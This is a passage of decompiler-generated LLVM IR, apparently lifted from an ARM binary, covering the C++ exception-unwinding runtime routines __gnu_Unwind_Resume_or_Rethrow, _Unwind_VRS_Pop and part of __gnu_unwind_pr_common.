  br i1 %v2_1a360, label %dec_label_pc_1a368, label %dec_label_pc_1a39c

dec_label_pc_1a368:                               ; preds = %entry
  %v0_1a368 = load i32, i32* @r5, align 4
  %v1_1a370 = add i32 %v0_1a368, 16
  %v2_1a370 = inttoptr i32 %v1_1a370 to i32*
  %v3_1a370 = load i32, i32* %v2_1a370, align 4
  call void @__pseudo_branch(i32 %v3_1a370)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1a388 = load i32, i32* %saved_vrs_-320, align 4
  %v1_1a38c = urem i32 %v2_1a388, 2
  %v2_1a38c = icmp eq i32 %v1_1a38c, 0
  br i1 %v2_1a38c, label %dec_label_pc_1a3ac, label %dec_label_pc_1a394

dec_label_pc_1a394:                               ; preds = %dec_label_pc_1a368, %dec_label_pc_1a3ac
  %v0_1a394 = phi i1 [ false, %dec_label_pc_1a368 ], [ %phitmp, %dec_label_pc_1a3ac ]
  br i1 %v0_1a394, label %dec_label_pc_1a3b8, label %dec_label_pc_1a39c

dec_label_pc_1a39c:                               ; preds = %entry, %dec_label_pc_1a394
  %v2_1a3a4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a3a4, i32* @r4, align 4
  store i32 %v6_1a30c, i32* @r5, align 4
  store i32 %v9_1a30c, i32* @r6, align 4
  store i32 %v12_1a30c, i32* @lr, align 4
  ret i32 9

dec_label_pc_1a3ac:                               ; preds = %dec_label_pc_1a368
  %v2_1a3ac = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_1a3ac, i32* @r0, align 4
  %v1_1a3b0 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_1a3ac)
  %v0_1a394.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_1a394.pre, 6
  br label %dec_label_pc_1a394

dec_label_pc_1a3b8:                               ; preds = %dec_label_pc_1a394
  %v0_1a3b8 = load i32, i32* @r5, align 4
  %v0_1a3bc = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_1a3b8, i32 %v0_1a3bc)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1a39c, { 1, 0 }
  uselistorder label %dec_label_pc_1a394, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_1a3c4 = add i32 %ucbp, 12
  %v2_1a3c4 = inttoptr i32 %v1_1a3c4 to i32*
  %v3_1a3c4 = load i32, i32* %v2_1a3c4, align 4
  %v2_1a3c8 = icmp eq i32 %v3_1a3c4, 0
  br i1 %v2_1a3c8, label %dec_label_pc_1a3d0, label %dec_label_pc_1a3d4

dec_label_pc_1a3d0:                               ; preds = %entry
  %v2_1a3d0 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_1a3d4

dec_label_pc_1a3d4:                               ; preds = %entry, %dec_label_pc_1a3d0
  %v1_1a3d4 = add i32 %entry_vrs, 60
  %v2_1a3d4 = inttoptr i32 %v1_1a3d4 to i32*
  %v3_1a3d4 = load i32, i32* %v2_1a3d4, align 4
  %v2_1a3dc = add i32 %entry_vrs, 64
  %v3_1a3dc = inttoptr i32 %v2_1a3dc to i32*
  store i32 %v3_1a3d4, i32* %v3_1a3dc, align 4
  %v3_1a3e0 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_1a3e0

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_1a3d4, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_1a440

bb:                                               ; preds = %entry
  %v7_1a3f8 = mul i32 %regclass, 4
  %v8_1a3f8 = add i32 %v7_1a3f8, ptrtoint (i32* @global_var_1a400.1108 to i32)
  call void @__pseudo_branch(i32 %v8_1a3f8)
  br label %dec_label_pc_1a440

dec_label_pc_1a440:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_1a528 = load i32, i32* @r4, align 4
  %v6_1a528 = load i32, i32* @r5, align 4
  %v2_1a538 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_1a540 = add i32 %ucbp, 76
  %v2_1a540 = inttoptr i32 %v1_1a540 to i32*
  %v3_1a540 = load i32, i32* %v2_1a540, align 4
  %v1_1a54c = inttoptr i32 %v3_1a540 to i32*
  %v2_1a54c = load i32, i32* %v1_1a54c, align 4
  store i32 %v2_1a54c, i32* @lr, align 4
  %v4_1a54c = add i32 %v3_1a540, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_1a558 = urem i32 %state, 4
  store i32 %v1_1a558, i32* %r2.global-to-local, align 4
  %v1_1a55c = and i32 %state, 8
  store i32 %v1_1a55c, i32* %r0.global-to-local, align 4
  %v4_1a56c = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_1a54c, i32* %v4_1a56c, align 8
  br i1 %v2_1a538, label %dec_label_pc_1a57c, label %dec_label_pc_1a858

dec_label_pc_1a57c:                               ; preds = %entry
  %v3_1a57c = mul i32 %v2_1a54c, 256
  store i32 %v3_1a57c, i32* %v4_1a56c, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a594

dec_label_pc_1a594:                               ; preds = %dec_label_pc_1a858, %dec_label_pc_1a57c
  %v0_1a5b8647090 = phi i32 [ %v2_1a870, %dec_label_pc_1a858 ], [ %v4_1a54c, %dec_label_pc_1a57c ]
  store i32 %v1_1a558, i32* %r2.global-to-local, align 4
  %v1_1a598 = add i32 %ucbp, 80
  %v2_1a598 = inttoptr i32 %v1_1a598 to i32*
  %v3_1a598 = load i32, i32* %v2_1a598, align 4
  %v7_1a59c = icmp eq i32 %v1_1a558, 2
  br i1 %v7_1a59c, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_1a594
  %v2_1a5a0 = add i32 %ucbp, 56
  %v3_1a5a0 = inttoptr i32 %v2_1a5a0 to i32*
  %v4_1a5a0 = load i32, i32* %v3_1a5a0, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_1a594, %bb
  %v0_1a5b86470 = phi i32 [ %v0_1a5b8647090, %dec_label_pc_1a594 ], [ %v4_1a5a0, %bb ]
  %v1_1a5a4 = urem i32 %v3_1a598, 2
  %v2_1a5a4 = icmp eq i32 %v1_1a5a4, 0
  br i1 %v2_1a5a4, label %dec_label_pc_1a5b8.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_1a678

dec_label_pc_1a5b8.preheader:                     ; preds = %bb148
  %v1_1a5b86571 = inttoptr i32 %v0_1a5b86470 to i32*
  %v2_1a5b86672 = load i32, i32* %v1_1a5b86571, align 4
  %v2_1a5bc6874 = icmp eq i32 %v2_1a5b86672, 0
  br i1 %v2_1a5bc6874, label %dec_label_pc_1a678, label %dec_label_pc_1a5c4.preheader.lr.ph.lr.ph

dec_label_pc_1a5c4.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_1a5b8.preheader
  %v7_1a5c8 = icmp eq i32 %id, 2
  %v2_1a654 = icmp eq i32 %v1_1a558, 0
  %v2_1a820 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_1a73c = icmp eq i32 %v1_1a55c, 0
  br label %dec_label_pc_1a5c4.preheader.lr.ph

dec_label_pc_1a5c4.preheader.lr.ph:               ; preds = %dec_label_pc_1a5c4.preheader.lr.ph.lr.ph, %dec_label_pc_1a88c
  %v1_1a5d496 = phi i32 [ %v2_1a5b86672, %dec_label_pc_1a5c4.preheader.lr.ph.lr.ph ], [ %v2_1a5b866, %dec_label_pc_1a88c ]
  %v1_1a5d093 = phi i32 [ %v0_1a5b86470, %dec_label_pc_1a5c4.preheader.lr.ph.lr.ph ], [ %v2_1a890, %dec_label_pc_1a88c ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_1a5c4.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_1a88c ]
  br label %dec_label_pc_1a5c4.preheader

dec_label_pc_1a5c4.preheader:                     ; preds = %dec_label_pc_1a5c4.preheader.lr.ph, %dec_label_pc_1a850
  %v1_1a5d495 = phi i32 [ %v1_1a5d496, %dec_label_pc_1a5c4.preheader.lr.ph ], [ %v2_1a5b8, %dec_label_pc_1a850 ]
  %v1_1a5d092 = phi i32 [ %v1_1a5d093, %dec_label_pc_1a5c4.preheader.lr.ph ], [ %v1_1a850, %dec_label_pc_1a850 ]
  br label %dec_label_pc_1a5c4

dec_label_pc_1a5c4:                               ; preds = %dec_label_pc_1a5c4.preheader, %dec_label_pc_1a668
  %v1_1a5d4 = phi i32 [ %v1_1a5d495, %dec_label_pc_1a5c4.preheader ], [ %v2_1a66c, %dec_label_pc_1a668 ]
  %v1_1a5e8 = phi i32 [ %v1_1a5d092, %dec_label_pc_1a5c4.preheader ], [ %v1_1a668, %dec_label_pc_1a668 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_1a5c8, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_1a5c4
  %v2_1a5cc = add i32 %v1_1a5e8, 4
  %v3_1a5cc = inttoptr i32 %v2_1a5cc to i32*
  %v4_1a5cc = load i32, i32* %v3_1a5cc, align 4
  store i32 %v4_1a5cc, i32* @r5, align 4
  store i32 %v1_1a5d4, i32* @r6, align 4
  %v0_1a5d8109 = load i32, i32* @r8, align 4
  %v1_1a5d8110 = add i32 %v0_1a5d8109, 72
  %v2_1a5d8111 = inttoptr i32 %v1_1a5d8110 to i32*
  %v3_1a5d8112 = load i32, i32* %v2_1a5d8111, align 4
  store i32 %v3_1a5d8112, i32* @lr, align 4
  %v2_1a5e4 = add i32 %v1_1a5e8, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_1a5c4
  %v2_1a5d0 = add i32 %v1_1a5e8, 2
  %v3_1a5d0 = inttoptr i32 %v2_1a5d0 to i16*
  %v4_1a5d0 = load i16, i16* %v3_1a5d0, align 2
  %v5_1a5d0 = zext i16 %v4_1a5d0 to i32
  store i32 %v5_1a5d0, i32* @r5, align 4
  %v0_1a5d8 = load i32, i32* @r8, align 4
  %v1_1a5d8 = add i32 %v0_1a5d8, 72
  %v2_1a5d8 = inttoptr i32 %v1_1a5d8 to i32*
  %v3_1a5d8 = load i32, i32* %v2_1a5d8, align 4
  store i32 %v3_1a5d8, i32* @lr, align 4
  %v2_1a5e0 = inttoptr i32 %v1_1a5e8 to i16*
  %v3_1a5e0 = load i16, i16* %v2_1a5e0, align 2
  %v4_1a5e0 = zext i16 %v3_1a5e0 to i32
  store i32 %v4_1a5e0, i32* @r6, align 4
  %v2_1a5e8 = add i32 %v1_1a5e8, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_1a5e8, %.thread16 ], [ %v2_1a5e4, %bb151 ]
  %v3_1a5d8115 = phi i32 [ %v3_1a5d8, %.thread16 ], [ %v3_1a5d8112, %bb151 ]
  %v0_1a5f0113 = phi i32 [ %v5_1a5d0, %.thread16 ], [ %v4_1a5cc, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_1a5f0 = and i32 %v0_1a5f0113, -2
  %v2_1a5f4 = add i32 %v1_1a5f0, %v3_1a5d8115
  store i32 %v2_1a5f4, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_1a604 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a604, i32* %r0.global-to-local, align 4
  %v5_1a610 = call i32 @_Unwind_VRS_Get(i32 %v0_1a604, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a610, i32* %r0.global-to-local, align 4
  %v3_1a614 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1a614, i32* %r2.global-to-local, align 4
  %v0_1a618 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_1a618, %v3_1a614
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_1a624

._crit_edge:                                      ; preds = %bb152
  %v0_1a63c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_1a624:                               ; preds = %bb152
  %v0_1a624 = load i32, i32* @r6, align 4
  %v1_1a624 = and i32 %v0_1a624, -2
  %v2_1a628 = add i32 %v1_1a624, %v0_1a618
  %v3_1a62c = icmp ult i32 %v3_1a614, %v2_1a628
  br i1 %v3_1a62c, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_1a624
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_1a624
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_1a63c = phi i32 [ %v0_1a63c.pre, %._crit_edge ], [ %v0_1a624, %bb153 ], [ %v0_1a624, %.thread20 ]
  %v0_1a7e4 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_1a638 = load i32, i32* @r5, align 4
  %v1_1a63c = urem i32 %v0_1a63c, 2
  %v1_1a638 = mul i32 %v0_1a638, 2
  %v3_1a640 = and i32 %v1_1a638, 2
  %v4_1a640 = or i32 %v3_1a640, %v1_1a63c
  store i32 %v4_1a640, i32* %r2.global-to-local, align 4
  %v7_1a644 = icmp eq i32 %v4_1a640, 1
  br i1 %v7_1a644, label %dec_label_pc_1a7d8, label %dec_label_pc_1a64c

dec_label_pc_1a64c:                               ; preds = %bb154
  %v2_1a644 = icmp eq i32 %v4_1a640, 0
  br i1 %v2_1a644, label %dec_label_pc_1a650, label %dec_label_pc_1a700

dec_label_pc_1a650:                               ; preds = %dec_label_pc_1a64c
  store i32 %v1_1a558, i32* %r2.global-to-local, align 4
  br i1 %v2_1a654, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_1a650
  %v0_1a668119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_1a668

bb155:                                            ; preds = %dec_label_pc_1a650
  %v2_1a660 = icmp eq i32 %v0_1a7e4, 0
  %v0_1a668 = load i32, i32* @r7, align 4
  br i1 %v2_1a660, label %dec_label_pc_1a668, label %dec_label_pc_1a9e0

dec_label_pc_1a668:                               ; preds = %.thread, %bb155
  %v0_1a668120 = phi i32 [ %v0_1a668119, %.thread ], [ %v0_1a668, %bb155 ]
  %v1_1a668 = add i32 %v0_1a668120, 4
  %v1_1a66c = inttoptr i32 %v1_1a668 to i32*
  %v2_1a66c = load i32, i32* %v1_1a66c, align 4
  %v2_1a670 = icmp eq i32 %v2_1a66c, 0
  br i1 %v2_1a670, label %dec_label_pc_1a678, label %dec_label_pc_1a5c4

dec_label_pc_1a678:                               ; preds = %dec_label_pc_1a88c, %dec_label_pc_1a850, %dec_label_pc_1a668, %dec_label_pc_1a5b8.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_1a5b8.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1a668 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1a850 ], [ %stack_var_-76.4, %dec_label_pc_1a88c ]
  %v0_1a678 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a678, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_1a680 = call i32 @__gnu_unwind_execute(i32 %v0_1a678, %anon_struct_13* %tmp156)
  store i32 %v4_1a680, i32* %r0.global-to-local, align 4
  store i32 %v4_1a680, i32* %r5.global-to-local, align 4
  %v2_1a684 = icmp eq i32 %v4_1a680, 0
  br i1 %v2_1a684, label %dec_label_pc_1a68c, label %dec_label_pc_1a708

dec_label_pc_1a68c:                               ; preds = %dec_label_pc_1a678
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_1a690 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_1a690, label %bb157, label %dec_label_pc_1a69c

bb157:                                            ; preds = %dec_label_pc_1a68c
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a70c

dec_label_pc_1a69c:                               ; preds = %dec_label_pc_1a68c
  %v2_1a69c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1a69c, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_1a6ac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a6ac, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_1a6b4 = call i32 @_Unwind_VRS_Get(i32 %v0_1a6ac, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_1a6b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_1a6ac, i32* %r0.global-to-local, align 4
  %v5_1a6cc = call i32 @_Unwind_VRS_Set(i32 %v0_1a6ac, i32 %v0_1a6b8, i32 14, i32 %v0_1a6b8, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a6cc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r2.global-to-local, align 4
  %v4_1a6d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 32) to i32*), align 4
  %v0_1a6dc = load i32, i32* %r5.global-to-local, align 4
  %v0_1a6e0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a6e0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_1a6d8, i32* %stack_var_-48, align 4
  %v5_1a6f4 = call i32 @_Unwind_VRS_Set(i32 %v0_1a6e0, i32 %v0_1a6dc, i32 15, i32 %v0_1a6dc, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a70c

dec_label_pc_1a700:                               ; preds = %dec_label_pc_1a64c
  %v7_1a700 = icmp eq i32 %v4_1a640, 2
  br i1 %v7_1a700, label %dec_label_pc_1a718, label %dec_label_pc_1a708

dec_label_pc_1a708:                               ; preds = %dec_label_pc_1a700, %dec_label_pc_1a7ec, %dec_label_pc_1a678, %dec_label_pc_1a9e0
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a70c

dec_label_pc_1a70c:                               ; preds = %bb157, %dec_label_pc_1aa18, %dec_label_pc_1a9a8, %bb166, %dec_label_pc_1a69c, %dec_label_pc_1a708
  %v1_1a714 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_1aa18 ], [ %v1_1a714.pre, %dec_label_pc_1a9a8 ], [ 7, %bb166 ], [ 7, %dec_label_pc_1a69c ], [ 9, %dec_label_pc_1a708 ]
  store i32 %v3_1a528, i32* %r4.global-to-local, align 4
  store i32 %v6_1a528, i32* %r5.global-to-local, align 4
  ret i32 %v1_1a714

dec_label_pc_1a718:                               ; preds = %dec_label_pc_1a700
  store i32 %v1_1a558, i32* %r2.global-to-local, align 4
  %v0_1a71c = load i32, i32* @r7, align 4
  %v1_1a71c = inttoptr i32 %v0_1a71c to i32*
  %v2_1a71c = load i32, i32* %v1_1a71c, align 4
  %tmp206 = bitcast i32 %v2_1a71c to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_1a724 = bitcast float %tmp207 to i32
  store i32 %v1_1a724, i32* @sl, align 4
  br i1 %v2_1a654, label %dec_label_pc_1a72c, label %dec_label_pc_1a898

dec_label_pc_1a72c:                               ; preds = %dec_label_pc_1a718
  %v2_1a72c = icmp eq i32 %v0_1a7e4, 0
  br i1 %v2_1a72c, label %dec_label_pc_1a880, label %dec_label_pc_1a734

dec_label_pc_1a734:                               ; preds = %dec_label_pc_1a72c
  %v2_1a738 = icmp eq i32 %v1_1a724, 0
  br i1 %v2_1a738, label %dec_label_pc_1a744.thread, label %bb159

dec_label_pc_1a744.thread:                        ; preds = %dec_label_pc_1a734
  br label %dec_label_pc_1a9a8

bb159:                                            ; preds = %dec_label_pc_1a734
  br i1 %v3_1a73c, label %dec_label_pc_1a74c, label %dec_label_pc_1a880

dec_label_pc_1a74c:                               ; preds = %bb159
  %v1_1a74c = add i32 %v0_1a71c, 4
  store i32 %v1_1a74c, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1a75c = load i32, i32* @r8, align 4
  %v1_1a75c = add i32 %v0_1a75c, 88
  store i32 %v1_1a75c, i32* %sb.global-to-local, align 4
  store i32 %v1_1a74c, i32* @r4, align 4
  br label %dec_label_pc_1a780

dec_label_pc_1a770:                               ; preds = %bb161
  %v1_1a770 = add i32 %v0_1a770, 1
  store i32 %v1_1a770, i32* @r5, align 4
  %v1_1a774 = load i32, i32* @sl, align 4
  %v9_1a774 = icmp eq i32 %v1_1a770, %v1_1a774
  %v0_1a778 = load i32, i32* @r4, align 4
  %v1_1a778 = add i32 %v0_1a778, 4
  store i32 %v1_1a778, i32* @r4, align 4
  br i1 %v9_1a774, label %dec_label_pc_1a9a8, label %dec_label_pc_1a770.dec_label_pc_1a780_crit_edge

dec_label_pc_1a770.dec_label_pc_1a780_crit_edge:  ; preds = %dec_label_pc_1a770
  %v0_1a78c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1a780

dec_label_pc_1a780:                               ; preds = %dec_label_pc_1a770.dec_label_pc_1a780_crit_edge, %dec_label_pc_1a74c
  %v0_1a78c = phi i32 [ %v0_1a78c.pre, %dec_label_pc_1a770.dec_label_pc_1a780_crit_edge ], [ %v1_1a75c, %dec_label_pc_1a74c ]
  %v1_1a790 = phi i32 [ %v1_1a778, %dec_label_pc_1a770.dec_label_pc_1a780_crit_edge ], [ %v1_1a74c, %dec_label_pc_1a74c ]
  %v1_1a780 = inttoptr i32 %v1_1a790 to i32*
  %v2_1a780 = load i32, i32* %v1_1a780, align 4
  %v2_1a784 = icmp eq i32 %v2_1a780, 0
  store i32 %v0_1a78c, i32* %forced_unwind_-44, align 4
  br i1 %v2_1a784, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_1a780
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_1a780, %bb160
  %v0_1a794 = load i32, i32* @r8, align 4
  store i32 %v0_1a794, i32* %r0.global-to-local, align 4
  store i32 %v2_1a820, i32* %r2.global-to-local, align 4
  %v4_1a7a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 100) to i32*), align 4
  store i32 108464, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1a7a4)
  %v0_1a7b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a7b0 = icmp eq i32 %v0_1a7b0, 0
  %v0_1a770 = load i32, i32* @r5, align 4
  br i1 %v2_1a7b0, label %dec_label_pc_1a770, label %dec_label_pc_1a7b8

dec_label_pc_1a7b8:                               ; preds = %bb161
  %v1_1a7b8 = load i32, i32* @sl, align 4
  %v9_1a7b8 = icmp eq i32 %v0_1a770, %v1_1a7b8
  br i1 %v9_1a7b8, label %dec_label_pc_1a9a8, label %dec_label_pc_1a7c0

dec_label_pc_1a7c0:                               ; preds = %dec_label_pc_1a7b8
  %v0_1a7c0 = load i32, i32* @r7, align 4
  %v1_1a7c0 = inttoptr i32 %v0_1a7c0 to i32*
  %v2_1a7c0 = load i32, i32* %v1_1a7c0, align 4
  %v1_1a7c4 = icmp slt i32 %v2_1a7c0, 0
  %v0_1a7cc.pre = load i32, i32* @r6, align 4
  br i1 %v1_1a7c4, label %dec_label_pc_1a7cc, label %dec_label_pc_1a88c

dec_label_pc_1a7cc:                               ; preds = %dec_label_pc_1a7c0, %dec_label_pc_1a884
  %v0_1a7cc = phi i32 [ %storemerge, %dec_label_pc_1a884 ], [ %v0_1a7cc.pre, %dec_label_pc_1a7c0 ]
  store i32 %v0_1a7cc, i32* %r0.global-to-local, align 4
  %v1_1a7d0 = add i32 %v0_1a7cc, 4
  store i32 %v1_1a7d0, i32* @r6, align 4
  br label %dec_label_pc_1a88c

dec_label_pc_1a7d8:                               ; preds = %bb154
  store i32 %v1_1a558, i32* %r2.global-to-local, align 4
  br i1 %v2_1a654, label %dec_label_pc_1a7e4, label %dec_label_pc_1a8d0

dec_label_pc_1a7e4:                               ; preds = %dec_label_pc_1a7d8
  %v2_1a7e4 = icmp eq i32 %v0_1a7e4, 0
  br i1 %v2_1a7e4, label %dec_label_pc_1a850, label %dec_label_pc_1a7ec

dec_label_pc_1a7ec:                               ; preds = %dec_label_pc_1a7e4
  %v0_1a7ec = load i32, i32* @r7, align 4
  %v1_1a7ec = add i32 %v0_1a7ec, 4
  %v2_1a7ec = inttoptr i32 %v1_1a7ec to i32*
  %v3_1a7ec = load i32, i32* %v2_1a7ec, align 4
  %v7_1a7f0 = icmp eq i32 %v3_1a7ec, -2
  store i32 %v1_1a7ec, i32* %r2.global-to-local, align 4
  br i1 %v7_1a7f0, label %dec_label_pc_1a708, label %dec_label_pc_1a7fc

dec_label_pc_1a7fc:                               ; preds = %dec_label_pc_1a7ec
  %v0_1a7fc = load i32, i32* @r8, align 4
  %v1_1a7fc = add i32 %v0_1a7fc, 88
  %v7_1a800 = icmp eq i32 %v3_1a7ec, -1
  store i32 %v1_1a7fc, i32* %forced_unwind_-44, align 4
  br i1 %v7_1a800, label %dec_label_pc_1a844, label %dec_label_pc_1a80c

dec_label_pc_1a80c:                               ; preds = %dec_label_pc_1a7fc
  %v2_1a810 = icmp eq i32 %v3_1a7ec, 0
  br i1 %v2_1a810, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_1a80c
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_1a80c, %bb162
  store i32 %v0_1a7fc, i32* %r0.global-to-local, align 4
  store i32 %v2_1a820, i32* %r2.global-to-local, align 4
  %v4_1a82c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 100) to i32*), align 4
  store i32 108600, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1a82c)
  %v0_1a838 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a838 = icmp eq i32 %v0_1a838, 0
  br i1 %v2_1a838, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_1a844.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_1a844

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_1a850

dec_label_pc_1a844:                               ; preds = %.thread25, %dec_label_pc_1a7fc
  %v3_1a844 = phi i32 [ %v3_1a844.pr, %.thread25 ], [ %v1_1a7fc, %dec_label_pc_1a7fc ]
  %v2_1a848 = icmp eq i32 %v3_1a844, 0
  br i1 %v2_1a848, label %dec_label_pc_1a850, label %dec_label_pc_1a9a8

dec_label_pc_1a850:                               ; preds = %bb164, %dec_label_pc_1a8fc, %dec_label_pc_1a8d0, %dec_label_pc_1a844, %dec_label_pc_1a7e4
  %v0_1a850 = load i32, i32* @r7, align 4
  %v1_1a850 = add i32 %v0_1a850, 8
  %v1_1a5b8 = inttoptr i32 %v1_1a850 to i32*
  %v2_1a5b8 = load i32, i32* %v1_1a5b8, align 4
  %v2_1a5bc = icmp eq i32 %v2_1a5b8, 0
  br i1 %v2_1a5bc, label %dec_label_pc_1a678, label %dec_label_pc_1a5c4.preheader

dec_label_pc_1a858:                               ; preds = %entry
  %v3_1a858 = udiv i32 %v2_1a54c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_1a868 = mul nuw nsw i32 %v3_1a858, 4
  %v3_1a86c = mul i32 %v2_1a54c, 65536
  %v2_1a870 = add i32 %v6_1a868, %v4_1a54c
  store i32 %v3_1a86c, i32* %v4_1a56c, align 8
  br label %dec_label_pc_1a594

dec_label_pc_1a880:                               ; preds = %bb159, %dec_label_pc_1a72c
  %v1_1a880 = add i32 %v0_1a71c, 4
  br label %dec_label_pc_1a884

dec_label_pc_1a884:                               ; preds = %dec_label_pc_1a8c4, %dec_label_pc_1a880
  %v0_1a884 = phi i32 [ %v2_1a8c4, %dec_label_pc_1a8c4 ], [ %v2_1a71c, %dec_label_pc_1a880 ]
  %storemerge = phi i32 [ %v4_1a8c4, %dec_label_pc_1a8c4 ], [ %v1_1a880, %dec_label_pc_1a880 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_1a884 = icmp slt i32 %v0_1a884, 0
  br i1 %v1_1a884, label %dec_label_pc_1a7cc, label %dec_label_pc_1a88c

